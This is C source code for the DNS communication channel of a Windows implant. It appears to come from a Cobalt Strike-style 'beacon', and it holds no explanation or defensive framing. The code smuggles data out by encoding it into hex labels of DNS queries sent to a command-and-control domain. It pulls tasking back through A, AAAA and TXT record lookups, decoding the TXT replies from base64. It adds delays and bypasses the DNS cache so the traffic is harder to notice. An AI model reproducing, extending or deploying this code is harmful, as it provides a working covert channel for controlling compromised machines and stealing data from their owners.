#include "channel.h"
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include "crypto.h" /* P4.15: 不再直接依赖 tomcrypt */
#include "beacon.h"

#pragma comment( lib, "dnsapi" )

int is_winsock_initialized = 0;
unsigned short maxdns   = 255;
unsigned int   dnssleep = 0;
unsigned int   dnsidle   = 0;

char * dnsbeacon_geta;
char * dnsbeacon_getaaaa;
char * dnsbeacon_gettxt;

char * dnsresolver;

/*
 * Initialize Winsock. This only needs to happen once.
 */
void channel_winsock_init() {
	WSADATA 			wsaData;
	WORD 				wVersionRequested;

	if (is_winsock_initialized == 1)
		return;

	wVersionRequested = MAKEWORD(2, 2);

	/* try to init winsock library */
	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		//dlog("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}

	is_winsock_initialized = 1;

	/* dnssleep setting! */
	dnssleep = setting_int(SETTING_DNS_SLEEP);

	/* initialize this value too */
	dnsidle  = setting_int(SETTING_DNS_IDLE);

	dnsbeacon_geta = setting_ptr(SETTING_DNS_BEACON_GET_A);
	dnsbeacon_getaaaa = setting_ptr(SETTING_DNS_BEACON_GET_AAAA);
	dnsbeacon_gettxt = setting_ptr(SETTING_DNS_BEACON_GET_TXT);

	// dlog("channel_tcp.channel_winsock_init - dnsbeacon_geta:  %s\n", dnsbeacon_geta);
	// dlog("channel_tcp.channel_winsock_init - dnsbeacon_getaaaa:  %s\n", dnsbeacon_getaaaa);
	// dlog("channel_tcp.channel_winsock_init - dnsbeacon_gettxt:  %s\n", dnsbeacon_gettxt);

    // Setup DNS Direct Egress (DNSResolver)
	dnsresolver = setting_ptr(SETTING_DNSRESOLVER);

	// dlog("channel_tcp.channel_winsock_init - dnsresolver: %s\n", dnsresolver);
}

void dns_sleep() {
	if (dnssleep > 0)
		Sleep(dnssleep);
}

void set_max_dns(unsigned int signal) {
	/* TXT record channel */
	if ((signal & 0x2) == 0x2) {
		maxdns = setting_short(SETTING_MAXDNS);
	}
	/* AAAA record channel */
	else if ((signal & 0x4) == 0x4) {
		maxdns = setting_short(SETTING_MAXDNS) / 2;
	}
	/* A record channel */
	else {
		maxdns = setting_short(SETTING_MAXDNS) / 4;
	}

	/* cap maxdns at 253. Why? this is the max we can safely get away with. Really! */
	if (maxdns > 253)
		maxdns = 253;
}

unsigned int dns_get(char * domain, char * buffer, int max) {
	unsigned int size = 0;
	unsigned int read = 0;
	unsigned int data = 0;
	char c2domain[1024];
	unsigned int reqno = 0;
	unsigned int nonce = (rand() | (rand() << 16));

	_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_geta, reqno, nonce, domain);
	// dlog("channel_tcp.dns_get:  %s\n", c2domain);
	size = ntohl(channel_lookup_retry(c2domain, 100)) ^ dnsidle;
	reqno++;

	/* sanity check to make sure nothing crazy is happening */
	if (size <= 0 || size > max) {
		return 0;
	}

	while (read < size) {
		_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_geta, reqno, nonce, domain);
		// dlog("channel_tcp.dns_get 2:  %s\n", c2domain);
		data = channel_lookup_retry(c2domain, 100);
		memcpy(buffer + read, (void *)&data, 4);
		read += 4;
		reqno++;
	}

	return size;
}

unsigned int dns_get6(char * domain, char * buffer, int max) {
	unsigned int size = 0;
	unsigned int read = 0;
	char data[16];
	char c2domain[1024];
	unsigned int reqno = 0;
	unsigned int nonce = (rand() | (rand() << 16));

	_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_getaaaa, reqno, nonce, domain);
	// dlog("channel_tcp.dns_get6:  %s\n", c2domain);
	size = ntohl(channel_lookup_retry(c2domain, 100)) ^ dnsidle;
	reqno++;

	/* sanity check to make sure nothing crazy is happening */
	if (size <= 0 || size > max) {
		return 0;
	}

	while (read < size) {
		_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_getaaaa, reqno, nonce, domain);
		// dlog("channel_tcp.dns_get6 2:  %s\n", c2domain);
		channel_lookup_retry6(c2domain, 100, data);
		memcpy(buffer + read, data, 16);
		read += 16;
		reqno++;
	}

	return size;
}

void dns_put(char * type, char * domain, char * buffer, int length) {
	unsigned int sent = 0;
	unsigned int data = 0;
	unsigned int dataz[26];
	char c2domain[1024];
	unsigned int reqno = 0;
	unsigned int nonce = (rand() | (rand() << 16));
	unsigned int maybe = 0;

	_snprintf(c2domain, 1024, "%s1%x.%x%x.%s", type, length, reqno, nonce, domain);
	// dlog("channel_tcp.dns_put:  %s\n", c2domain);
	channel_lookup_retry(c2domain, 100);
	reqno++;

	while (sent < length) {
		/* we need to reset this! */
		maybe = 0;

		/* send 104 bytes = 26 single requests */
		if ((sent + 104) <= length) {
			memcpy((void *)&dataz, buffer + sent, 104);
			_snprintf(c2domain, 1024, "%s4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), htonl(dataz[10]), htonl(dataz[11]), htonl(dataz[12]), htonl(dataz[13]), htonl(dataz[14]), htonl(dataz[15]), htonl(dataz[16]), htonl(dataz[17]), htonl(dataz[18]), htonl(dataz[19]), htonl(dataz[20]), htonl(dataz[21]), htonl(dataz[22]), htonl(dataz[23]), htonl(dataz[24]), htonl(dataz[25]), reqno, nonce, domain);
			maybe = 104;
		}

		/* send 84 bytes = 21 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 84) <= length) {
			memcpy((void *)&dataz, buffer + sent, 84);
			_snprintf(c2domain, 1024, "%s3%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), htonl(dataz[10]), htonl(dataz[11]), htonl(dataz[12]), htonl(dataz[13]), htonl(dataz[14]), htonl(dataz[15]), htonl(dataz[16]), htonl(dataz[17]), htonl(dataz[18]), htonl(dataz[19]), htonl(dataz[20]), reqno, nonce, domain);
			maybe = 84;
		}

		/* send 56 bytes = 14 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 56) <= length) {
			memcpy((void *)&dataz, buffer + sent, 56);
			_snprintf(c2domain, 1024, "%s2%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), htonl(dataz[10]), htonl(dataz[11]), htonl(dataz[12]), htonl(dataz[13]), reqno, nonce, domain);
			maybe = 56;
		}

		/* send 48 bytes = 12 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 48) <= length) {
			memcpy((void *)&dataz, buffer + sent, 48);
			_snprintf(c2domain, 1024, "%s2%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), htonl(dataz[10]), htonl(dataz[11]), reqno, nonce, domain);
			maybe = 48;
		}

		/* send 40 bytes = 10 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 40) <= length) {
			memcpy((void *)&dataz, buffer + sent, 40);
			_snprintf(c2domain, 1024, "%s2%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), htonl(dataz[7]), htonl(dataz[8]), htonl(dataz[9]), reqno, nonce, domain);
			maybe = 40;
		}

		/* send 28 bytes = 7 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 28) <= length) {
			memcpy((void *)&dataz, buffer + sent, 28);
			_snprintf(c2domain, 1024, "%s1%08x%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), htonl(dataz[6]), reqno, nonce, domain);
			maybe = 28;
		}

		/* send 24 bytes = 6 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 24) <= length) {
			memcpy((void *)&dataz, buffer + sent, 24);
			_snprintf(c2domain, 1024, "%s1%08x%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), htonl(dataz[5]), reqno, nonce, domain);
			maybe = 24;
		}

		/* send 20 bytes = 5 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 20) <= length) {
			memcpy((void *)&dataz, buffer + sent, 20);
			_snprintf(c2domain, 1024, "%s1%08x%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), htonl(dataz[4]), reqno, nonce, domain);
			maybe = 20;
		}

		/* send 16 bytes = 4 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 16) <= length) {
			memcpy((void *)&dataz, buffer + sent, 16);
			_snprintf(c2domain, 1024, "%s1%08x%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), htonl(dataz[3]), reqno, nonce, domain);
			maybe = 16;
		}

		/* send 12 bytes = 3 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 12) <= length) {
			memcpy((void *)&dataz, buffer + sent, 12);
			_snprintf(c2domain, 1024, "%s1%08x%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), htonl(dataz[2]), reqno, nonce, domain);
			maybe = 12;
		}

		/* send 8 bytes = 2 single requests */
		if ((maybe == 0 || strlen(c2domain) >= maxdns) && (sent + 8) <= length) {
			memcpy((void *)&dataz, buffer + sent, 8);
			_snprintf(c2domain, 1024, "%s1%08x%08x.%x%x.%s", type, htonl(dataz[0]), htonl(dataz[1]), reqno, nonce, domain);
			maybe = 8;
		}

		/* send 4 bytes = 1 single request */
		if (maybe == 0 || strlen(c2domain) >= maxdns) {
			memcpy((void *)&data, buffer + sent, 4);
			_snprintf(c2domain, 1024, "%s1%08x.%x%x.%s", type, htonl(data), reqno, nonce, domain);
			maybe = 4;
		}

		/* increment our sent pointer by the selected number of bytes */
		sent += maybe;

    	// dlog("channel_tcp.dns_put 2:  %s\n", c2domain);

		/* do our lookup */
		channel_lookup_retry(c2domain, 100);
		reqno++;
	}
}

/* make a lookup via an explicit resolver */
DNS_STATUS channel_lookup_explicit(char * dnsresolver, char * domain, WORD wType, PDNS_RECORD * ppDnsRecord) {
	IP4_ARRAY SrvList;

	/* use normal behavior, if no dnsresolver */
	if (strlen(dnsresolver) == 0) {
		// dlog("channel_tcp.channel_lookup - BLANK... \n");
		return DnsQuery_A(domain, wType, 0, NULL, ppDnsRecord, NULL);
	}

	/* setup the structure */
	SrvList.AddrCount = 1;
	inet_pton(AF_INET, dnsresolver, &SrvList.AddrArray[0]); // DNS server IPv4 address

	/* make our query */
	return DnsQuery_A(domain, wType, DNS_QUERY_BYPASS_CACHE, &SrvList, ppDnsRecord, NULL);
}

unsigned int channel_lookup_retry(char * domain, int retry) {
	int x;
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;

	channel_winsock_init();

	/* introduce artificial latency between requests--if the user wants this? */
	dns_sleep();

	/* try to resolve our domain a certain number of times */
	for (x = 0; x < retry; x++) {

		// dlog("channel_tcp.channel_lookup_retry - %d dnsresolver: %s domain: %s \n", retry, dnsresolver, domain);

		status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_A, &pDnsRecord);

		if (!status) {
			/* free the information */
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			return pDnsRecord->Data.A.IpAddress;
		}

		/* sleep for 5s if a failure happens... we'll try again at that time */
		Sleep(x + 1000);
	}

	return 0L;
}

/* 
 * This is our function for beaconing over DNS.
 */
BOOL channel_lookup(char * domain, unsigned int * result) {
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;

	/* init please */
	channel_winsock_init();

	/* introduce artificial latency between requests--if the user wants this? */
	dns_sleep();

	// dlog("channel_tcp.channel_lookup - dnsresolver: %s (%d) domain: %s \n", dnsresolver, strlen(dnsresolver), domain);

	status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_A, &pDnsRecord);

	if (!status) {
		/* get our data */
		*result = pDnsRecord->Data.A.IpAddress;

		/* free the information */
		DnsRecordListFree(pDnsRecord, DnsFreeRecordList);

		return TRUE;
	}

	return FALSE;
}

unsigned int dns_get_txt(char * domain, char * buffer, int max) {
	char c2domain[1024];
	char encoded[1024];
	char decoded[1024];
	unsigned int read = 0;
	unsigned int reqno = 0;
	unsigned int nonce = (rand() | (rand() << 16));
	unsigned int size = 0;
	unsigned int dlen = 1024;
	unsigned int status = 0;
	unsigned int total = 0;

	/* how many bytes are we going to download? */
	_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_gettxt, reqno, nonce, domain);
    // dlog("channel_tcp.dns_get_txt:  %s\n", c2domain);
	total = ntohl(channel_lookup_retry(c2domain, 100)) ^ dnsidle;
	reqno++;

	/* sanity check to make sure nothing crazy is happening */
	if (total <= 0 || total > max) {
		return 0;
	}

	while (size < total) {
		/* create a domain with a nonce in it */
		_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_gettxt, reqno, nonce, domain);
        // dlog("channel_tcp.dns_get_txt:  %s\n", c2domain);

		/* read data from some TXT records */
		read = channel_lookup_retry_txt(c2domain, 100, encoded, 1024);
		if (read <= 0)
			return -1;

		encoded[read] = '\0';

		/* base64 decode the returned data */
		status = crypto_base64_decode((const unsigned char *)encoded, read, (unsigned char *)decoded, (unsigned long*) & dlen);
		if (status != CRYPTO_OK)
			return -1;

		/* if we're ok, copy [dlen] bytes into our buffer */
		if ((size + dlen) < max) {
			memcpy(buffer + size, decoded, dlen);
			size += dlen;
		}
		else {
			return -1;
		}

		/* fscking DNS cache... increment our nonce */
		reqno++;
	}

	return size;
}

int channel_lookup_retry_txt(char * domain, int retry, char * buffer, int max) {
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;

	int x;
	int y;
	int l;
	int t = 0;

	/* more artificial latency */
	dns_sleep();

	/* try up to [retry] times to grab the DNS record */
	for (x = 0; x < retry; x++) {

		// dlog("channel_tcp.channel_lookup_retry_txt - %d dnsresolver: %s domain: %s \n", retry, dnsresolver, domain);

		status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_TEXT, &pDnsRecord);

		if (!status) {
			/* get all of our strings please */
			for (y = 0; y < pDnsRecord->Data.TXT.dwStringCount; y++) {
				/* how long is our data? */
				l = (int)strlen(pDnsRecord->Data.TXT.pStringArray[y]);

				if ((t + l) < max) {
					/* copy our DNS data please */
					memcpy(buffer, (char *)(pDnsRecord->Data.TXT.pStringArray[y]), l);

					/* increment our buffer too, plz */
					buffer += l;
				}
				else {
					/* fail... not enough space! */
					return -2;
				}

				/* increment our total data */
				t += l;
			}

			/* free the information */
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);

			/* return the total number of characters copied to buffer */
			return t;
		}
		else {
			/* something failed... back off! */
			Sleep(x + 1000);
		}
	}

	/* we failed, call the whole thing off */
	return -1;
}

int channel_lookup_retry6(char * domain, int retry, char * buffer) {
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;

	int x;
	int t = 0;

	/* more artificial latency */
	dns_sleep();

	/* try up to [retry] times to grab the DNS record */
	for (x = 0; x < retry; x++) {

		// dlog("channel_tcp.channel_lookup_retry6 - %d dnsresolver: %s domain: %s \n", retry, dnsresolver, domain);

		status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_AAAA, &pDnsRecord);

		if (!status) {
			/* get our data */
			memcpy(buffer, pDnsRecord->Data.AAAA.Ip6Address.IP6Byte, 16);

			/* free the information */
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);

			/* return the total number of characters copied to buffer */
			return 16;
		}
		else {
			/* something failed... back off! */
			Sleep(x + 1000);
		}
	}

	/* we failed, call the whole thing off */
	return -1;
}

u_long channel_localip() {
	SOCKET sd;
	INTERFACE_INFO InterfaceList[20];
	u_long nBytesReturned;
	u_long retVal = 0;
	int nNumInterfaces = 0;
	int i;

	channel_winsock_init();

	sd = WSASocket(AF_INET, SOCK_DGRAM, 0, 0, 0, 0);
	if (sd == INVALID_SOCKET) {
		return 0;
	}

	if (WSAIoctl(sd, SIO_GET_INTERFACE_LIST, 0, 0, &InterfaceList,
		sizeof(InterfaceList), &nBytesReturned, 0, 0) == 0) {
		nNumInterfaces = nBytesReturned / sizeof(INTERFACE_INFO);
	}

	for (i = 0; i < nNumInterfaces; ++i) {
		SOCKADDR_IN *pAddress;
		u_long nFlags;

		pAddress = (SOCKADDR_IN *)& (InterfaceList[i].iiAddress);
		nFlags = InterfaceList[i].iiFlags;
		/* find the first interface that is not a loopback and is up */
		if (!(nFlags & IFF_LOOPBACK) && nFlags & IFF_UP) {
			retVal = pAddress->sin_addr.S_un.S_addr;
			break;
		}
	}

	closesocket(sd);
	return retVal;
}